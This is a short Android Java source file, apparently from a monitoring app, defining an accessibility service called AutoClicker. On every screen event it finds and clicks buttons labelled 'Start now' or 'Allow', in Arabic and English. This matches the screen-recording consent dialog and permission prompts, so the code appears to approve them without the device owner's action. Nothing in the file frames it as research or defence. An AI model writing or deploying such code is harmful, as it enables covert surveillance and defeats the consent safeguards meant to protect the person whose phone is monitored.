package com.tom5.monitor;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoClicker extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        String[] targets = {"البدء الآن", "Start now", "بدء الآن", "START NOW", "السماح", "Allow"};
        for (String t : targets) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
            for (AccessibilityNodeInfo n : nodes) {
                n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                n.recycle();
            }
        }
    }
    @Override public void onInterrupt() {}
}
